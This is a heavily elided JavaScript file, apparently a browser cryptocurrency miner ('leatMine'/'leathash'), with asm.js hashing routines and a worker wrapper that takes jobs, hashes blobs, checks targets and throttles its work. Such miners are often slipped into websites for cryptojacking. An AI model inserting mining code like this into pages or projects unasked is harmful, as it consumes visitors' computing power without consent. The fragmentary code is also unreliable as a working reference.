leatMine = leatMine || self.leatMine || {};
leatMine.CONFIG = {
...
var asm = (function(global, env, buffer) {
  ...
  function ya(b, d, e, f) {
    ...
    do {
      ...
      do {
        ...
        f = f + 1 | 0;
        g = g + 1 | 0
      } while ((f | 0) < (h | 0));d = d + 128 | 0
    } while (d >>> 0 < 2097152);n = b + 2097184 | 0;
    j = b + 2097488 | 0;
    D = B;
    g = n;
    f = c[g >> 2] ^ c[D >> 2];
    ...
    do {
      ...
      f = f + 4 | 0;
      g = g + 4 | 0
    } while ((f | 0) < (h | 0));Va(c[o >> 2] | 0, n, 32) | 0;
    f = b + 2097368 | 0;
    g = b + 2097384 | 0;
    h = b + 2097400 | 0;
    i = b + 2097416 | 0;
  ...
  function Aa(a, b, c) {
    ...
    b = b | 0;
    c = c | 0;
    if (!(Ma(256, a, b << 3, 0, c) | 0))
      return;
    else
      ia(7380, 7395, 43, 7425)
  }
  function Ba(a, b, c) {
    a = a | 0;
    b = b | 0;
  ...
  function Ja(a, b, d) {
    ...
    while (1) {
      ...
      do {
        ...
        d = d + 4 | 0;
        e = e + 4 | 0
      } while ((d | 0) < (f | 0));c[C >> 2] = c[a >> 2] ^ c[b >> 2];
      c[R >> 2] = c[Q >> 2] ^ c[b + 4 >> 2];
      c[i >> 2] = c[h >> 2] ^ c[b + 8 >> 2];
  ...
  function Pa(b, d, e) {
    ...
    do {
      ...
      g = g + 1 | 0;
      b = b + 1 | 0
    } while ((g | 0) < (d | 0));g = f + 80 | 0;
    d = g + 120 | 0;
    do {
      c[g >> 2] = 0;
      g = g + 4 | 0
    } while ((g | 0) < (d | 0));b = f + 72 | 0;
    g = b;
    c[g >> 2] = c[b >> 2];
    c[g + 4 >> 2] = 1;
    g = f + 128 | 0;
  ...
  function Wa() {
    ...
    g = c[n + 4 >> 2] | 0;
    a = c[n >> 2] | 0;
    a = j + 1901 + m + k + (b + j) + i + h + g + a + (tb() | 0) | 0;
    if (b | 0)
      $a(b);
    rb(a);
    c[d >> 2] = 0;
  ...
  function qb(a) {
    ...
    b = a + 20 | 0;
    h = a + 28 | 0;
    if ((c[b >> 2] | 0) >>> 0 > (c[h >> 2] | 0) >>> 0 ? (ma[c[a + 36 >> 2] & 3](a, 0, 0) | 0,
    (c[b >> 2] | 0) == 0) : 0)
      a = -1;
    else {
      d = a + 4 | 0;
  ...
  function Ab(a, b) {
    ...
    e = b >>> 16;
    b = N(e, f) | 0;
    return (y = (a >>> 16) + (N(e, d) | 0) + (((a & 65535) + b | 0) >>> 16) | 0,
    a + b << 16 | c & 65535 | 0) | 0
  }
  function Bb(a, b, c, d) {
    a = a | 0;
    ...
    c = Ab(e, f) | 0;
    a = y;
    return (y = (N(b, f) | 0) + (N(d, e) | 0) + a | a & 0,
    c | 0 | 0) | 0
  }
  function Cb(a) {
    a = a | 0;
...
var _leathash_hash = Module["_leathash_hash"] = asm["_leathash_hash"];
...
var _leathash_create = Module["_leathash_create"] = asm["_leathash_create"];
...
var _leathash_destroy = Module["_leathash_destroy"] = asm["_leathash_destroy"];
...
run();
var LeathashWASMWrapper = (function() {
  this.ctx = _leathash_create();
  this.throttleWait = 0;
...
LeathashWASMWrapper.prototype.onMessage = (function(msg) {
  var job = msg.data;
  if (job.verify_id) {
    this.verify(job);
    return
...
LeathashWASMWrapper.prototype.destroy = (function() {
  _leathash_destroy(this.ctx)
}
);
LeathashWASMWrapper.prototype.hexToBytes = (function(hex, bytes) {
...
LeathashWASMWrapper.prototype.bytesToHex = (function(bytes) {
...
LeathashWASMWrapper.prototype.meetsTarget = (function(hash, target) {
...
LeathashWASMWrapper.prototype.setJob = (function(job) {
  this.currentJob = job;
...
LeathashWASMWrapper.prototype.now = (function() {
  return self.performance ? self.performance.now() : Date.now()
}
);
LeathashWASMWrapper.prototype.hash = (function(input, output, length) {
  ...
  _leathash_hash(this.ctx, input.byteOffset, output.byteOffset, length)
}
);
LeathashWASMWrapper.prototype.verify = (function(job) {
  this.blob = this.hexToBytes(job.blob);
  this.input.set(this.blob);
  ...
  _leathash_hash(this.ctx, this.input.byteOffset, this.output.byteOffset, this.blob.length);
...
LeathashWASMWrapper.prototype.work = (function() {
  var hashes = 0;
...
LeathashWASMWrapper.prototype.workThrottled = (function() {
  var start = this.now();
  this.hash(this.input, this.output, this.blob.length);
  var end = this.now();
